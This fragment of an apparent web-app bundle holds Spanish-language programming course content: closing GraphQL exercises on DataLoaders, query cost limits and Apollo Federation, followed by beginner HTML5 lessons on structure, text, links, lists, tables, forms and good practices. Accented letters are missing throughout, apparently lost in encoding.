**Escenario:** Tienes un endpoint de "Dashboard de Administracin" que pide 100 proyectos, y para cada proyecto pide el nombre del dueo y los ltimos 10 logs de actividad.
*Consigna:* Explica cmo usaras **DataLoaders** para que este dashboard pase de hacer 201 consultas a solo 3 consultas.

## 2. El Desafo de la Seguridad (Cost Analysis)
**Escenario:** Un usuario enva esta query:
\`\`\`graphql
query {
  allUsers {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}
\`\`\`
*Consigna:* Si cada nivel de anidacin multiplica el costo por 10, cmo evitaras que esta query congele tu servidor?

## 3. Arquitectura Federation
**Escenario:** Tienes un equipo de "Stock" y un equipo de "Ventas". Ambos necesitan acceder al tipo \`Product\`. 
*Consigna:* Describe cmo dividiras el Schema usando Apollo Federation para que cada equipo sea dueo de su parte del producto sin pisarse.

---

### Recordatorio Final:
En el nivel Senior, el xito se mide en milisegundos de latencia y en la facilidad de otros equipos para integrar sus servicios. 
`,completed:!1,isProject:!0}]},nv={id:"html",title:"HTML5: El Lenguaje de la Web",description:"Aprende a estructurar sitios web modernos, desde la semntica bsica hasta la arquitectura avanzada y accesibilidad.",completed:!1,lessons:[{id:"html-junior-01-intro-html",title:"Leccin 1: Qu es HTML y cmo funciona la web?",level:"junior",content:`# Leccin 1: Qu es HTML y cmo funciona la web?

## 1. Introduccin al Mundo Web

Imagina que quieres construir una casa. Necesitas un plano, ladrillos y una estructura que le d forma. En el mundo de internet, **HTML** es esa estructura.

**HTML** significa *HyperText Markup Language* (Lenguaje de Marcado de Hipertexto). No te asustes por el nombre tcnico. Simplemente es el lenguaje que usamos para decirle al navegador (como Google Chrome, Firefox o Edge) qu contenido debe mostrar en pantalla: qu es un ttulo, qu es un prrafo, qu es una imagen, etc.

HTML **NO** es un lenguaje de programacin (como Python o Java) porque no tiene lgica (no puede "pensar", sumar nmeros o tomar decisiones). Es un **lenguaje de marcado** que *describe* y *estructura* la informacin.

## 2. Cmo funciona la web?

Cuando entras a una pgina web como \`www.ejemplo.com\`, suceden tres pasos principales:

1.  **Tu navegador (el cliente)** enva una peticin a una computadora especial que guarda las pginas web **(el servidor)**.
2.  **El servidor** busca la pgina que pediste y le enva el archivo HTML de vuelta a tu navegador.
3.  **Tu navegador** lee ese cdigo HTML y lo "dibuja" en tu pantalla para que t puedas leerlo y verlo bonito.

Este proceso sucede en milisegundos.

## 3. La analoga del peridico

Piensa en una pgina web como si fuera un peridico:
*   Tiene un ttulo grande al inicio.
*   Tiene subttulos para separar secciones.
*   Tiene prrafos de texto.
*   Tiene imgenes.

HTML es el encargado de decirle al navegador: "Oye, esto de aqu es el ttulo grande", "esto es una foto", "esto es un enlace". Sin HTML, la web sera solo un montn de texto plano sin forma ni sentido.

## 4. Ejemplos Reales: Cdigo vs. Resultado

As se ve el cdigo HTML de un saludo simple:

\`\`\`html
<!-- Esto es un encabezado o ttulo -->
<h1>Hola Mundo!</h1>

<!-- Esto es un prrafo de texto normal -->
<p>Bienvenidos a mi primera pgina web.</p>
\`\`\`

Y el navegador mostrara algo as:

# Hola Mundo!

Bienvenidos a mi primera pgina web.

*(Notars que el "Hola Mundo!" se ve ms grande y en negrita porque es un ttulo)*

---

## 5. Errores Comunes de Principiantes

*   **Creer que HTML es para programar lgica:** Recuerda, HTML solo *estructura*. Para dar estilo (colores, fuentes) usaremos **CSS**, y para la lgica (interactividad) usaremos **JavaScript** ms adelante.
*   **Olvidar cerrar las etiquetas:** Casi todo en HTML tiene un inicio y un fin. Si abres un \`<h1>\` y no lo cierras con \`</h1>\`, todo el texto siguiente se ver gigante!

---

## 6. Tu primer ejercicio prctico

Es hora de probar!

1.  Abre un editor de texto simple (como el "Bloc de notas" en Windows o "TextEdit" en Mac).
2.  Escribe el siguiente texto: \`Hola, soy [Tu Nombre] y estoy aprendiendo HTML.\`
3.  Guarda el archivo con el nombre \`index.html\`. Es muy importante que termine en \`.html\` y no en \`.txt\`!
4.  Busca el archivo que guardaste y haz doble clic. Se abrir en tu navegador.
5.  Felicidades! Has creado tu primera pgina web, aunque sea muy simple.

**Mini-Reto:**
Intenta cambiar el texto del archivo, gurdalo y luego recarga la pgina en tu navegador para ver el cambio.
`,completed:!1},{id:"html-junior-02-estructura-basica",title:"Leccin 2: Estructura bsica de un documento HTML",level:"junior",content:`# Leccin 2: Estructura bsica de un documento HTML

## 1. El esqueleto de una pgina

Al igual que una carta formal tiene partes definidas (fecha, saludo, cuerpo, despedida), un documento HTML tambin tiene una estructura obligatoria. Si no sigues esta estructura, el navegador podra confundirse y mostrar tu pgina mal.

Todo documento HTML debe seguir este patrn estndar:

\`\`\`html
<!DOCTYPE html>
<html>
    <head>
        <!-- Aqu va la informacin tcnica que NO se ve en la pgina -->
        <title>Mi Primera Pgina</title>
    </head>
    
    <body>
        <!-- Aqu va TODO lo que el usuario S ve -->
        <h1>Hola a todos!</h1>
        <p>Este es el cuerpo de mi pgina.</p>
    </body>
</html>
\`\`\`

Vamos a desglosar qu significa cada parte.

## 2. Partes de la estructura

### \`<!DOCTYPE html>\`
Es la primera lnea de cualquier archivo HTML moderno. Le dice al navegador: "Oye, estoy usando **HTML5**, la versin ms moderna y estndar". Sin esto, el navegador podra usar modos antiguos y romper tu diseo.

### \`<html> ... </html>\`
Es la etiqueta raz. Todo tu cdigo (absolutamente todo, excepto el DOCTYPE) debe estar *dentro* de estas dos etiquetas. Es como los muros de la casa.

### \`<head> ... </head>\` (La Cabeza)
Aqu va la informacin para el navegador y los buscadores (como Google). Lo que pones aqu **NO se ve directamente en la pgina web** (a excepcin del ttulo en la pestaa).
*   Configuracin de caracteres (para que se vean las  y tildes).
*   El ttulo de la pestaa del navegador.
*   Enlaces a archivos de estilo (CSS).

### \`<body> ... </body>\` (El Cuerpo)
Aqu va **todo el contenido visible**.
*   Textos
*   Imgenes
*   Videos
*   Botones
Todo lo que el usuario puede ver y tocar va aqu.

## 3. Ejemplo prctico explicado

\`\`\`html
<!DOCTYPE html>
<html lang="es"> <!-- lang="es" indica que la pgina est en Espaol -->
<head>
    <meta charset="UTF-8"> <!-- Importante para ver tildes y  -->
    <title>Mi Blog Personal</title>
</head>
<body>
    <h1>Bienvenido a mi blog</h1>
    <p>Hoy aprenderemos sobre la estructura HTML.</p>
</body>
</html>
\`\`\`

Si guardas este cdigo en un archivo \`.html\` y lo abres:
1.  Vers "Mi Blog Personal" en la pestaa superior del navegador.
2.  Vers el ttulo grande y el prrafo en la pgina blanca.

## 4. Anidacin (Nesting)

En HTML, unas etiquetas van dentro de otras. Esto se llama **anidacin**.
Es como las muecas rusas (Matrioskas).

**Correcto:**
\`\`\`html
<p>Texto con <strong>negrita</strong> bien cerrada</p>
\`\`\`

**Incorrecto (Error de cruce):**
\`\`\`html
<p>Texto con <strong>negrita</p> mal cerrada</strong>
\`\`\`
*El navegador se confundir porque cerraste el prrafo \`<p>\` antes de cerrar la negrita \`<strong>\`.*

## 5. Ejercicio Prctico

Crea un archivo llamado \`estructura.html\` y copia la estructura bsica que aprendimos.
Intenta cumplir estos requisitos:
1.  Que el ttulo de la pestaa diga "Estructura Correcta".
2.  Que en el cuerpo (\`body\`) aparezca tu nombre completo.
3.  Asegrate de incluir \`<meta charset="UTF-8">\` para que puedas usar tildes.
`,completed:!1},{id:"html-junior-03-etiquetas-esenciales",title:"Leccin 3: Etiquetas esenciales (html, head, body)",level:"junior",content:`# Leccin 3: Etiquetas esenciales (html, head, body)

## 1. Profundizando en los bloques principales

En la leccin anterior vimos el esqueleto. Ahora vamos a entender *por qu* son tan importantes estas tres etiquetas: \`<html>\`, \`<head>\` y \`<body>\`. Son los pilares de cualquier sitio web, desde el ms simple hasta Facebook o Google.

## 2. La etiqueta \`<html>\`

Es el elemento raz.
*   **Atributo importante:** \`lang\`.
    Siempre deberas escribir \`<html lang="es">\` si tu pgina es en espaol, o \`<html lang="en">\` si es en ingls.
    *   **Por qu?** Ayuda a los lectores de pantalla (para personas ciegas) a saber cmo pronunciar el texto y a los navegadores a ofrecer traduccin automtica.

## 3. La etiqueta \`<head>\`: El cerebro invisible

El \`head\` contiene metadatos (datos sobre datos). Aunque no lo ves, controla cmo se comporta tu pgina.

Elementos comunes dentro de \`<head>\`:

*   **\`<title>\`**: Define el texto que aparece en la **pestaa** del navegador y en los resultados de Google. Es vital para el SEO (que te encuentren en Google)!
    \`\`\`html
    <title>Recetas de Cocina de la Abuela</title>
    \`\`\`

*   **\`<meta charset="UTF-8">\`**:
    Esta lnea parece rara, pero es **obligatoria** si hablas espaol.
    *   Sin ella: \`Maana habr quis\` se vera \`Maana habr oquis\`.
    *   Con ella: \`Maana habr oquis\` se ve perfecto.
    Le dice al navegador que use el juego de caracteres universal que incluye tildes, , emojis, etc.

*   **\`<meta name="description" content="...">\`**:
    Es el resumen que aparece debajo del enlace azul en Google.
    \`\`\`html
    <meta name="description" content="Aprende a cocinar las mejores recetas caseras paso a paso.">
    \`\`\`

## 4. La etiqueta \`<body>\`: El escenario visible

El \`body\` es donde ocurre la magia visual. **Solo puede haber UN** \`<body>\` por pgina.

Errores comunes en el \`body\`:
*   Poner el \`<body>\` dentro del \`<head>\` (Jams!).
*   Tener dos etiquetas \`<body>\`.
*   Escribir contenido visible (como un ttulo \`<h1>\`) fuera del \`body\`. Aunque a veces el navegador lo corrige, es una mala prctica tcnica.

## 5. El Modelo de Caja (Introduccin visual)

Imagina que estas etiquetas son cajas contenedoras:

1.  La caja \`<html>\` es la caja de mudanza gigante que envuelve todo.
2.  Dentro, hay dos cajas separadas que NO se tocan:
    *   Caja \`<head>\`: Llena de manuales e instrucciones y configuraciones.
    *   Caja \`<body>\`: Llena de muebles, cuadros y decoracin.

## 6. Ejercicio: "El Detective de Cdigo"

Copia el siguiente cdigo en un archivo y **encuentra los 3 errores** que he puesto a propsito. Luego corrgelos para que funcionen bien.

**Cdigo con errores:**

\`\`\`html
<!DOCTYPE html>
<html>
    <head>
        <title>Pgina con errores</title>
        <h1>Hola, soy un ttulo perdido</h1> <!-- ERROR 1 -->
    </head>
    
    <body>
        <p>Este prrafo est bien.</p>
    </body>
    
    <p>Este prrafo est fuera de lugar.</p> <!-- ERROR 2 -->
    
    <body> <!-- ERROR 3 -->
        <p>Otro cuerpo???</p>
    </body>
</html>
\`\`\`

**Pistas:**
1.  Los ttulos visibles pueden ir en el \`head\`?
2.  Puede haber contenido fuera de \`html\` o despus de cerrar \`body\`?
3.  Cuntos \`body\` puede tener un documento?
`,completed:!1},{id:"html-junior-04-textos",title:"Leccin 4: Ttulos, prrafos y texto",level:"junior",content:`# Leccin 4: Ttulos, prrafos y texto

## 1. La Jerarqua de los Ttulos (Headings)

En HTML, los ttulos no solo sirven para hacer el texto grande. Sirven para dar **estructura lgica** y jerarqua a tu contenido. Es como un ndice de un libro.

Existen 6 niveles de ttulos: \`<h1>\` hasta \`<h6>\`.

*   **\`<h1>\`**: El ttulo principal de la pgina. **Solo debe haber UNO por pgina**. Es lo ms importante para Google.
*   **\`<h2>\`**: Ttulos de secciones principales.
*   **\`<h3>\`**: Subttulos dentro de las secciones.
*   ... y as hasta el \`<h6>\`.

**Ejemplo visual:**

\`\`\`html
<h1>Los Planetas</h1> (Ttulo principal)
    <h2>Planetas Interiores</h2> (Seccin 1)
        <h3>Tierra</h3> (Sub-seccin)
        <h3>Marte</h3> (Sub-seccin)
    <h2>Planetas Exteriores</h2> (Seccin 2)
        <h3>Jpiter</h3> (Sub-seccin)
\`\`\`

**Error comn:** No uses un \`<h2>\` solo porque quieres que el texto se vea mediano. Usa la etiqueta correcta segn la importancia del texto, y luego cambia el tamao con CSS (estilos).

## 2. Prrafos \`<p>\`

Para escribir texto normal, usamos la etiqueta \`<p>\` (paragraph).

\`\`\`html
<p>Este es un prrafo de texto normal. HTML ignorar      los espacios    extra   que pongas.</p>
\`\`\`

**Dato clave:** Si en tu cdigo das muchos "Enter" (saltos de lnea), HTML los ignorar y mostrar todo seguido.
Para forzar un salto de lnea dentro de un prrafo, usa la etiqueta \`<br>\` (break), aunque no se abusa de ella.

\`\`\`html
<p>
    Lnea uno.<br>
    Lnea dos.
</p>
\`\`\`

## 3. Formato de Texto: Negritas y Cursivas

Para enfatizar partes del texto, usamos estas etiquetas:

*   **Negrita (Importante):** \`<strong>\`
    *   Uso: \`<strong>Texto muy importante</strong>\`
    *   Tambin existe \`<b>\`, pero \`<strong>\` le dice a Google que eso *es* importante, no solo visualmente "negrito".
    
*   *Cursiva (nfasis):* \`<em>\`
    *   Uso: \`<em>Texto con nfasis</em>\`
    *   Tambin existe \`<i>\`, pero \`<em>\` (emphasis) es semnticamente mejor.

**Ejemplo combinado:**

\`\`\`html
<p>
    Bienvenido! Es <strong>muy importante</strong> que leas las instrucciones.
    <em>(Por favor, no te saltes este paso)</em>.
</p>
\`\`\`

## 4. Comentarios en el cdigo

A veces quieres dejar notas para ti mismo que **el usuario no vea**.

\`\`\`html
<!-- Este es un comentario secreto que solo se ve en el cdigo -->
<p>Este texto s se ve.</p>
\`\`\`

## 5. Ejercicio Prctico "Tu Biografa"

Crea una pgina \`biografia.html\` que tenga:
1.  Un \`<h1>\` con tu nombre.
2.  Un \`<h2>\` que diga "Sobre m".
3.  Un prrafo \`<p>\` describindote. Usa **negritas** para resaltar tus cualidades.
4.  Un \`<h2>\` que diga "Mis Hobbies".
5.  Un prrafo explicando qu te gusta hacer, usando *cursivas* para los nombres de tus actividades.
`,completed:!1},{id:"html-junior-05-enlaces-imagenes",title:"Leccin 5: Enlaces e imgenes",level:"junior",content:`# Leccin 5: Enlaces e imgenes

## 1. Enlaces: La "Web" en World Wide Web

Los enlaces (links) son lo que hacen que la web sea una "red". Nos permiten saltar de una pgina a otra.
La etiqueta para los enlaces es \`<a>\` (de *anchor* o ancla).

### Estructura de un enlace

\`\`\`html
<a href="https://www.google.com">Ir a Google</a>
\`\`\`

*   **\`<a>\`**: La etiqueta de apertura.
*   **\`href="..."\`**: Es el atributo ms importante (Hypertext REFerence). Aqu pones la direccin (URL) a donde quieres ir.
*   **"Ir a Google"**: Es el texto "clicable" que ve el usuario.
*   **\`</a>\`**: La etiqueta de cierre.

### Tipos de enlaces

1.  **Enlaces externos:** Van a otro sitio web.
    \`\`\`html
    <a href="https://www.youtube.com" target="_blank">Ver videos</a>
    \`\`\`
    *Truco:* El atributo \`target="_blank"\` hace que el enlace se abra en una **pestaa nueva**, muy til para no sacar al usuario de tu pgina.

2.  **Enlaces internos:** Van a otra pgina de tu mismo sitio.
    \`\`\`html
    <a href="contacto.html">Contctame</a>
    \`\`\`

## 2. Imgenes: Dando vida al sitio

La etiqueta para imgenes es \`<img>\`.
OJO! Esta es una etiqueta especial: **no tiene etiqueta de cierre**. Se cierra sola.

### Estructura de una imagen

\`\`\`html
<img src="foto-gatito.jpg" alt="Un gatito adorable durmiendo">
\`\`\`

*   **\`src="..."\`**: (Source o Fuente). Es la ruta al archivo de la imagen. Puede ser un archivo en tu carpeta o una URL de internet.
*   **\`alt="..."\`**: (Alternative Text). **Importantsimo!**
    1.  Si la imagen no carga (error de internet), se mostrar este texto.
    2.  Es lo que leen las personas ciegas que usan lectores de pantalla.
    3.  Ayuda a Google a entender qu hay en la foto.

### Cambiando el tamao

Puedes controlar el tamao con \`width\` (ancho) y \`height\` (alto). Es mejor usar solo uno para que la imagen no se deforme.

\`\`\`html
<!-- Ancho de 300 pixeles, el alto se ajusta automtico -->
<img src="logo.png" alt="Logo de la empresa" width="300">
\`\`\`

## 3. Combinando Enlaces e Imgenes

Quieres que una imagen sea clicable? Pon la imagen DENTRO de la etiqueta \`<a>\`!

\`\`\`html
<a href="https://www.instagram.com">
    <img src="icono-instagram.png" alt="Ir a mi Instagram" width="50">
</a>
\`\`\`

## 4. Ejercicio Prctico "Galera de Favoritos"

1.  Busca en Google 3 imgenes de cosas que te gusten (comida, lugares, juegos).
2.  Copia la "Direccin de la imagen" (Click derecho -> Copiar direccin de imagen).
3.  Crea un archivo \`galeria.html\`.
4.  Crea un ttulo \`<h1>\` que diga "Mis cosas favoritas".
5.  Pon las 3 imgenes usando la etiqueta \`<img>\`. No olvides el \`alt\` .
6.  Haz que al hacer clic en una de ellas, te lleve a una pgina web relacionada (por ejemplo, a Wikipedia).
`,completed:!1},{id:"html-junior-06-listas",title:"Leccin 6: Listas (ul, ol, li)",level:"junior",content:`# Leccin 6: Listas (ul, ol, li)

## 1. Organizando la informacin

A nadie le gusta leer bloques de texto gigantes. Las listas son perfectas para organizar tems de forma clara y fcil de leer.

En HTML hay dos tipos principales de listas:
1.  **Listas Desordenadas** (Con puntitos o *bullets*).
2.  **Listas Ordenadas** (Con nmeros 1, 2, 3...).

## 2. Listas Desordenadas \`<ul>\`
Se usan cuando el orden de los elementos no importa (como una lista de compras).
*   \`<ul>\` significa *Unordered List*.
*   \`<li>\` significa *List Item* (cada elemento de la lista).

\`\`\`html
<h3>Lista de Compras</h3>
<ul>
    <li>Leche</li>
    <li>Huevos</li>
    <li>Pan</li>
</ul>
\`\`\`
**Resultado:**
* Leche
* Huevos
* Pan

## 3. Listas Ordenadas \`<ol>\`
Se usan cuando el orden S importa (como una receta o un ranking).
*   \`<ol>\` significa *Ordered List*.
*   Tambin usa \`<li>\` para los elementos.

\`\`\`html
<h3>Pasos para hacer caf</h3>
<ol>
    <li>Hervir el agua.</li>
    <li>Poner caf en la taza.</li>
    <li>Servir el agua caliente.</li>
</ol>
\`\`\`
**Resultado:**
1. Hervir el agua.
2. Poner caf en la taza.
3. Servir el agua caliente.

## 4. Listas Anidadas (Listas dentro de listas)

Puedes meter una lista dentro de otra. Es muy comn en mens de navegacin o ndices.

\`\`\`html
<ul>
    <li>Frutas
        <ul>
            <li>Manzana</li>
            <li>Banana</li>
        </ul>
    </li>
    <li>Verduras
        <ul>
            <li>Lechuga</li>
            <li>Zanahoria</li>
        </ul>
    </li>
</ul>
\`\`\`

**Resultado visual:**
* Frutas
    * Manzana
    * Banana
* Verduras
    * Lechuga
    * Zanahoria

## 5. Ejercicio Prctico "Tu Top 3"

Crea un archivo \`listas.html\` y haz lo siguiente:

1.  Usa una **lista ordenada** (\`<ol>\`) para escribir tu Top 3 de pelculas o series favoritas.
2.  Usa una **lista desordenada** (\`<ul>\`) para listar 3 ingredientes que necesitas para cocinar tu comida favorita.
3.  **Reto:** Intenta anidar una lista. Por ejemplo, dentro de una pelcula, pon una lista desordenada con los nombres de 2 actores de esa pelcula.
`,completed:!1},{id:"html-junior-07-tablas",title:"Leccin 7: Tablas",level:"junior",content:`# Leccin 7: Tablas

## 1. Cundo usar tablas?

Antiguamente, las tablas se usaban para disear toda la pgina web (un horror!). Hoy en da, **solo** debemos usar tablas mostrar **datos tabulares**.
Ejemplos correctos:
*   Un horario de clases.
*   Una lista de precios.
*   Una tabla de posiciones de ftbol.

## 2. Estructura de una Tabla

Las tablas en HTML se construyen fila por fila (horizontalmente). Es un poco como armar un rompecabezas.

Las etiquetas clave son:
*   \`<table>\`: Envuelve toda la tabla.
*   \`<tr>\`: *Table Row* (Fila de la tabla). Crea una lnea horizontal.
*   \`<th>\`: *Table Header* (Encabezado de tabla). La celda del ttulo (negrita y centrada por defecto).
*   \`<td>\`: *Table Data* (Dato de tabla). La celda normal con informacin.

## 3. Ejemplo paso a paso

Vamos a crear una tabla de alumnos y notas.

\`\`\`html
<table border="1"> <!-- border="1" es para ver las lneas temporalmente -->
    
    <!-- Primera fila: Los encabezados -->
    <tr>
        <th>Nombre</th>
        <th>Edad</th>
        <th>Nota</th>
    </tr>

    <!-- Segunda fila: Datos del primer alumno -->
    <tr>
        <td>Juan</td>
        <td>15</td>
        <td>Aprobado</td>
    </tr>

    <!-- Tercera fila: Datos del segundo alumno -->
    <tr>
        <td>Mara</td>
        <td>16</td>
        <td>Sobresaliente</td>
    </tr>

</table>
\`\`\`

## 4. Organizando mejor: La Semntica

Para tablas profesionales, podemos agrupar las filas en tres secciones, igual que un documento HTML:
1.  \`<thead>\`: La cabecera (donde van los ttulos).
2.  \`<tbody>\`: El cuerpo (donde van los datos).
3.  \`<tfoot>\`: El pie de tabla (donde van totales o resmenes).

\`\`\`html
<table>
    <thead>
        <tr>
            <th>Producto</th>
            <th>Precio</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Manzanas</td>
            <td>$100</td>
        </tr>
        <tr>
            <td>Peras</td>
            <td>$120</td>
        </tr>
    </tbody>
    <tfoot>
        <tr>
            <td>Total</td>
            <td>$220</td>
        </tr>
    </tfoot>
</table>
\`\`\`
*Esto ayuda a los navegadores y a la accesibilidad a entender mejor tu tabla.*

## 5. Ejercicio Prctico "El Horario"

Crea un archivo \`horario.html\`.
Disea una tabla simple que represente tu semana (Lunes a Viernes).
*   La primera fila (\`<th>\`) debe tener los das de la semana.
*   Crea al menos 2 filas ms (\`<tr>\`) con actividades que hagas esos das (ej: "Estudiar", "Gimnasio", "Trabajar").
*   No olvides poner \`border="1"\` en la etiqueta table para poder ver las celdas! (Ms adelante aprenderemos a hacer bordes bonitos con CSS).
`,completed:!1},{id:"html-junior-08-formularios",title:"Leccin 8: Formularios bsicos",level:"junior",content:`# Leccin 8: Formularios bsicos

## 1. Interactuando con el usuario

Hasta ahora, nuestras pginas solo muestran informacin. Pero, y si queremos que el usuario nos enve informacin? Para eso existen los **Formularios**.
Son esenciales para: Iniciar sesin, registrarse, buscar en Google, comprar online, etc.

La etiqueta padre es \`<form>\`.

\`\`\`html
<form action="/enviar-datos" method="POST">
    <!-- Aqu van los campos para escribir -->
</form>
\`\`\`

*   \`action\`: A dnde se envan los datos cuando terminas (una URL).
*   \`method\`: Cmo se envan (generalmente "GET" para buscar o "POST" para guardar datos privados).

## 2. La etiqueta Input (Entrada)

La etiqueta reina de los formularios es \`<input>\`. Es camalenica: cambia de forma segn su atributo \`type\`.
Como \`<img>\`, **no tiene etiqueta de cierre**.

\`\`\`html
<!-- Caja de texto simple para nombres -->
<label>Nombre:</label>
<input type="text" placeholder="Escribe tu nombre aqu">
\`\`\`

## 3. Labels (Etiquetas)

Es una buena prctica SIEMPRE acompaar un input con un \`<label>\`. El label le dice al usuario qu debe escribir ah.

Forma pro de conectarlos:
Usar \`id\` en el input y \`for\` en el label. Esto hace que si haces clic en el texto "Nombre:", el cursor se activa en la cajita. Magia de usabilidad!

\`\`\`html
<label for="email-usuario">Correo Electrnico:</label>
<input type="email" id="email-usuario" name="email">
\`\`\`

## 4. Tipos bsicos de Input

Aunque profundizaremos en la prxima leccin, estos son los esenciales:

*   \`type="text"\`: Texto normal (Nombre, Ciudad).
*   \`type="password"\`: Contrasea (aparecen puntitos ****).
*   \`type="email"\`: Valida que tenga un @.
*   \`type="number"\`: Solo permite nmeros.

## 5. Ejemplo de Formulario de Login Simple

\`\`\`html
<form>
    <h2>Iniciar Sesin</h2>
    
    <div>
        <label for="user">Usuario:</label>
        <input type="text" id="user" name="usuario">
    </div>
    
    <br>

    <div>
        <label for="pass">Contrasea:</label>
        <input type="password" id="pass" name="contrasea">
    </div>

    <br>

    <button type="submit">Entrar</button>
</form>
\`\`\`

## 6. Ejercicio "Formulario de Contacto"

Crea un archivo \`contacto.html\`.
Haz un formulario bsico que pida:
1.  Nombre (texto).
2.  Edad (nmero).
3.  Correo electrnico (email).
4.  Un botn para enviar.

Usa etiquetas \`<label>\` para cada campo. Asegrate de que el campo de contrasea oculte lo que escribes!
`,completed:!1},{id:"html-junior-09-inputs-botones",title:"Leccin 9: Inputs y botones avanzados",level:"junior",content:'# Leccin 9: Inputs y botones avanzados\n\n## 1. Ms all del texto simple\n\nEn la leccin anterior vimos los inputs bsicos. HTML5 trajo muchos tipos nuevos de inputs que mejoran la experiencia en celulares y validan datos automticamente.\n\n### Inputs tiles\n*   **`type="date"`**: Muestra un calendario para elegir fecha. Genial para cumpleaos!\n    ```html\n    <input type="date" name="cumpleanos">\n    ```\n*   **`type="color"`**: Abre la paleta de colores.\n    ```html\n    <input type="color" name="color-favorito">\n    ```\n*   **`type="range"`**: Una barra deslizante (slider).\n    ```html\n    <input type="range" min="0" max="100">\n    ```\n*   **`type="file"`**: Para subir archivos o fotos.\n    ```html\n    <input type="file">\n    ```\n\n## 2. Textarea: Para textos largos\n\nSi quieres que el usuario escriba un mensaje largo (como un comentario o biografa), `input type="text"` se queda corto. Usa `<textarea>`.\n\n```html\n<label>Deja tu comentario:</label>\n<textarea rows="4" cols="50" placeholder="Escribe aqu..."></textarea>\n```\n*Nota: Textarea S tiene etiqueta de cierre `</textarea>`.*\n\n## 3. Checkbox y Radio Buttons\n\nPara elegir opciones:\n\n**Checkbox (Casilla de verificacin):** Puedes elegir varias opciones.\n```html\n<p>Elige tus frutas favoritas:</p>\n<input type="checkbox" id="manzana"> <label for="manzana">Manzana</label>\n<input type="checkbox" id="pera"> <label for="pera">Pera</label>\n```\n\n**Radio Button (Botn de opcin):** Solo puedes elegir UNA opcin de un grupo.\n*Truco:* Para que funcionen como grupo, deben tener el mismo `name`.\n\n```html\n<p>Elige tu gnero:</p>\n<input type="radio" id="hombre" name="genero" value="h">\n<label for="hombre">Hombre</label>\n\n<input type="radio" id="mujer" name="genero" value="m">\n<label for="mujer">Mujer</label>\n```\n\n## 4. Botones\n\nHay tres tipos principales de botones dentro de un formulario:\n\n1.  `<button type="submit">Enviar</button>`: Enva el formulario (es el por defecto).\n2.  `<button type="reset">Borrar</button>`: Borra todo lo que escribiste en el formulario.\n3.  `<button type="button">Click me</button>`: No hace nada por s solo (se usa con JavaScript).\n\n## 5. Ejercicio "Encuesta Divertida"\n\nCrea un archivo `encuesta.html` con un formulario que pregunte:\n1.  Nombre completo.\n2.  Fecha de nacimiento (usa `date`).\n3.  Color favorito (usa `color`).\n4.  Te gusta el chocolate? (S/No usando `radio buttons`).\n5.  Qu mascotas tienes? (Perro, Gato, Pez usando `checkbox`).\n6.  Un botn grande que diga "Enviar Respuestas".\n',completed:!1},{id:"html-junior-10-buenas-practicas",title:"Leccin 10: Buenas prcticas bsicas",level:"junior",content:`# Leccin 10: Buenas prcticas bsicas

## 1. Cdigo Limpio, Cdigo Feliz

Escribir cdigo HTML que "funcione" es fcil. Escribir cdigo PROFESIONAL que sea fcil de leer, mantener y entienda Google es un arte. Aqu tienes las reglas de oro para empezar con el pie derecho.

## 2. Indentacin (Sangra)

Es el espacio que dejamos al inicio de una lnea para mostrar que una etiqueta est *dentro* de otra.
Ayuda visualmente a entender la jerarqua.

**Mal (Difcil de leer):**
\`\`\`html
<html>
<head>
<title>Mi Web</title>
</head>
<body>
<div>
<p>Hola</p>
</div>
</body>
</html>
\`\`\`

**Bien (Fcil de leer):**
\`\`\`html
<html>
    <head>
        <title>Mi Web</title>
    </head>
    <body>
        <div>
            <p>Hola</p>
        </div>
    </body>
</html>
\`\`\`
*Tip: Usa la tecla "Tab" de tu teclado para indentar.*

## 3. Usa siempre minsculas en etiquetas

HTML no es sensible a maysculas (funciona igual \`<BODY>\` que \`<body>\`), PERO el estndar mundial y profesional es escribir **todas las etiquetas y atributos en minsculas**.

*   Mal: \`<IMG SRC="foto.jpg">\`
*   Bien: \`<img src="foto.jpg">\`

## 4. Cierra todas las etiquetas

Aunque algunas etiquetas funcionan si olvidas cerrarlas (como \`<p>\` o \`<li>\`), es una psima prctica! Acostmbrate a cerrarlas siempre.
*   Mal: \`<li>Elemento 1 <li>Elemento 2\`
*   Bien: \`<li>Elemento 1</li><li>Elemento 2</li>\`

## 5. El atributo \`alt\` en imgenes

Nunca, jams olvides el atributo \`alt\` en una imagen.
*   Es vital para las personas ciegas.
*   Es vital para SEO (Google).
*   Es vital si la imagen falla.

## 6. No inventes estructura con etiquetas de texto

No uses \`<h1>\` para hacer un texto grande si no es un ttulo.
No uses \`<b>\` o negritas para hacer subttulos.
Usa la etiqueta correcta para el significado correcto (Semntica).

*   Es una lista? Usa \`<ul>\` o \`<ol>\`, no guiones manuales.
*   Es un prrafo? Usa \`<p>\`, no saltos de lnea \`<br><br>\`.

## 7. Reto Final: "El Auditor de Cdigo"

Mira este cdigo desastroso. Tu trabajo es reescribirlo en un nuevo archivo aplicando todas las buenas prcticas que aprendiste: Indentacin, minsculas, cierre de etiquetas y semntica.

**Cdigo Feo:**
\`\`\`html
<HTML><HEAD><TITLE>mi PAGINA</TITLE></HEAD><BODY>
<H1>BIENVENIDOS</H1>
Esta es mi web.<BR><BR>
<IMG SRC="foto.jpg">
<B>Lista de cosas:</B><BR>
- Cosa 1<BR>
- Cosa 2
</BODY></HTML>
\`\`\`

Si logras arreglar esto, ya ests listo para el siguiente nivel!
Felicidades por completar el mdulo bsico de HTML!
`,completed:!1},{id:"html-junior-exercises",title:"Ejercicios Prcticos",level:"junior",content:`# Ejercicios Prcticos del Mdulo HTML Junior

## Ejercicio 1: Mi Primera Pgina Personal

**Objetivo:** Crear una pgina de presentacin personal utilizando la estructura bsica y las etiquetas de texto esenciales.

**Consigna:**
Crea un archivo llamado \`perfil.html\`.
La estructura debe incluir:
1.  El \`Doctype\` y las etiquetas \`html\`, \`head\` y \`body\`.
2.  Un ttulo principal (\`h1\`) con tu nombre completo.
3.  Un subttulo (\`h2\`) que diga "Desarrollador Web en formacin".
4.  Un prrafo (\`p\`) describiendo quin eres y por qu quieres aprender a programar. Usa **negritas** para resaltar tus cualidades principales.
5.  Un comentario en el cdigo que diga "Esta es mi primera web".

**Resultado Esperado:**
Una pgina con fondo blanco (o el que tenga tu navegador por defecto) que muestre tu informacin jerarquizada por tamaos (ttulo grande, subttulo mediano, texto normal).

---

## Ejercicio 2: Galera de Intereses

**Objetivo:** Practicar el uso de imgenes y atributos.

**Consigna:**
Crea un archivo llamado \`intereses.html\`.
1.  Agrega un ttulo que diga "Mis Intereses".
